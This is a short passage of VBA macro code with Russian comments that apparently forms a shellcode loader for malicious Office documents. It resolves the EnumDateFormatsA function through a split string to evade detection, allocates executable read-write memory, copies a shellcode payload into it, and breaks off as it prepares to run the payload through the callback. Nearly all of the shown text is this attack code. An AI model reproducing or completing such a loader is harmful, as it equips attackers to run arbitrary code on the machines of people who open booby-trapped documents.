...
Sub Init()
    ...
    Dim pEnum As LongPtr: pEnum = GetProcAddress(hKern, "Enum" & "Date" & "FormatsA") ' Callback-функция
    
    Dim addr As LongPtr
    ' Выделяем память (RWX = 0x40, MEM_COMMIT|RESERVE = 0x3000)
    addr = CallPtr(pAlloc, 0, UBound(finalPayload) + 1, &H3000, &H40)
    
    If addr <> 0 Then
        ' Копируем чистый шеллкод в выделенную память
        MoveMem addr, VarPtr(finalPayload(0)), UBound(finalPayload) + 1
        ' Вызываем Callback, передавая адрес шеллкода как указатель на функцию
